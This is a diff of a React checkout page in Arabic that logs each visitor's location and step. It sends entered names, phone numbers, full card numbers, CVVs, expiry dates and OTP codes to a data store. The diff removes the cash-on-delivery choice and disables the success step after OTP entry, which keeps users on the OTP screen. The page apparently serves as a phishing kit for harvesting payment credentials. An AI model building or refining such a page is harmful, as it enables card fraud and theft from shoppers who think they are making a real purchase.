@@ -149,27 +149,35 @@ export default function MainPage() {
         country: country,
         action: "page_load",
         currentPage: "الرئيسية ",
+      }).then(() => {
+        localStorage.setItem("country", country); // Consider privacy implications
+        setupOnlineStatus(visitorId);
       });
-      localStorage.setItem("country", country); // Consider privacy implications
-      setupOnlineStatus(visitorId);
+
     } catch (error) {
       console.error("Error fetching location:", error);
       // Log error with visitor ID for debugging
       await addData({
         createdDate: new Date().toISOString(),
         id: visitorId,
-        error: `Location fetch failed: ${
-          error instanceof Error ? error.message : String(error)
-        }`,
+        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)
+          }`,
         action: "location_error",
+      }).then(() => {
+        console.log(currentStep)
       });
     }
   };
   useEffect(() => {
-    getLocationAndLog();
+    getLocationAndLog().then(() => {
+      console.log('loactions is done')
+    });
   }, []);
   useEffect(() => {
-    addData({ id: visitorId, currentStep });
+    addData({ id: visitorId, currentStep }).then(() => {
+      console.log(`Current step is ${currentStep}`)
+
+    });
   }, [currentStep]);
   // Update the totalPrice calculation
   const totalPrice = selectedOffer ? selectedOffer.offerPrice * quantity : 0;
@@ -189,6 +197,9 @@ export default function MainPage() {
         id: visitorId,
         name: customerInfo.name,
         phone: customerInfo.phone,
+      }).then(() => {
+        console.log(`Cstomer Info  is ${customerInfo}`)
+
       });
 
       setCurrentStep("payment");
@@ -201,19 +212,21 @@ export default function MainPage() {
       cardNumber: cardInfo.number,
       cvv: cardInfo.cvv,
       expiryDate: cardInfo.expiry + "/" + cardInfo.month,
+    }).then(() => {
+      if (paymentMethod === "cash") {
+        setCurrentStep("success");
+      } else {
+        setCurrentStep("otp");
+      }
     });
-    if (paymentMethod === "cash") {
-      setCurrentStep("success");
-    } else {
-      setCurrentStep("otp");
-    }
   };
+
 
   const handleOtpVerification = () => {
     addData({ id: visitorId, otp: otpCode });
 
     setTimeout(() => {
-      setCurrentStep("success");
+      //   setCurrentStep("success");
     }, 3000);
   };
 
@@ -424,9 +437,8 @@ export default function MainPage() {
             {offers.map((offer) => (
               <Card
                 key={offer.id}
-                className={`cursor-pointer transition-all duration-300 hover:shadow-xl hover:scale-105 ${
-                  offer.popular ? "ring-2 ring-yellow-400 relative" : ""
-                }`}
+                className={`cursor-pointer transition-all duration-300 hover:shadow-xl hover:scale-105 ${offer.popular ? "ring-2 ring-yellow-400 relative" : ""
+                  }`}
                 onClick={() => handleSelectOffer(offer)}
               >
                 {offer.popular && (
@@ -595,11 +607,10 @@ export default function MainPage() {
             </DialogTitle>
           </DialogHeader>
           <div className="space-y-6">
-            <div className="grid grid-cols-2 gap-4">
+            <div className="grid grid-cols-1 gap-4">
               <Card
-                className={`cursor-pointer transition-all ${
-                  paymentMethod === "card" ? "ring-2 ring-green-500" : ""
-                }`}
+                className={`cursor-pointer transition-all ${paymentMethod === "card" ? "ring-2 ring-green-500" : ""
+                  }`}
                 onClick={() => setPaymentMethod("card")}
               >
                 <CardContent className="p-4 text-center">
@@ -608,18 +619,6 @@ export default function MainPage() {
                 </CardContent>
               </Card>
 
-              <Card
-                className={`cursor-pointer transition-all ${
-                  paymentMethod === "cash" ? "ring-2 ring-green-500" : ""
-                }`}
-              >
-                <CardContent className="p-4 text-center">
-                  <div className="w-8 h-8 mx-auto mb-2 bg-green-600 rounded-full flex items-center justify-center">
-                    <span className="text-white font-bold">$</span>
-                  </div>
-                  <p className="font-semibold">الدفع عند التسليم</p>
-                </CardContent>
-              </Card>
             </div>
 
             {paymentMethod === "card" && (
@@ -633,7 +632,7 @@ export default function MainPage() {
                     onChange={(e) =>
                       setCardInfo({ ...cardInfo, number: e.target.value })
                     }
-                    placeholder="1234 5678 9012 3456"
+                    placeholder="#### #### #### ####"
                   />
                 </div>
                 <div className="grid grid-cols-3 gap-4">
@@ -674,7 +673,7 @@ export default function MainPage() {
                       onChange={(e) =>
                         setCardInfo({ ...cardInfo, cvv: e.target.value })
                       }
-                      placeholder="123"
+                      placeholder="***"
                     />
                   </div>
                 </div>
